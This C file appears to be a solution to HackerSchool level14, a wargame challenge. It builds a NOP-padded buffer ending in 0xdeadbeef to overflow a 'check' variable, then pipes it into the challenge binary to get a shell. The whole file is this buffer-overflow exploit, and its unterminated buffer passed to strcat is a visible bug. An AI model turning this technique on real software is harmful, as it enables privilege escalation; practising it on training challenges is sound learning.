/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level14
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 44   /* NOP(40) + check(0xdeadbeef) */

// "int check" 변수에 입력할 값
char writecode[] = "\xef\xbe\xad\xde";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
    shellLen = strlen(writecode);

	// "char buf[20]" 에 40 바이트의 NOP 썰매 할당
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
   
	// "int check" 변수에 조건 값 입력
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = writecode[j];
    
    // 공격 명령어 생성
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level14/attackme");
    strcat(cmdBuf, "\x0a");
    system(cmdBuf);
}
